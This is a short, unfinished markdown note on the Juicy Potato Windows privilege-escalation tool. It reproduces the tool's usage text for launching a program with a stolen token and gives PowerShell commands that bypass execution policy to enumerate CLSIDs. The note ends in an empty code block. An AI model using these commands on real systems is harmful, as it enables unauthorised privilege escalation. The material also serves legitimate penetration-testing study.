# Juicy Potato (abusing the golden privileges)

## usage

```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-z only test CLSID and print token's user
```

## Checking CLSIDs
### run first
```
powershell.exe -ExecutionPolicy Bypass -File "C:\Temp\Join-Object.ps1"
```
### get list CLSIDs and APIDs
```
powershell.exe -ExecutionPolicy Bypass -File "C:\Temp\GetCLSID.ps1"
```
### get list CLSIDs and APIDs
```

```

















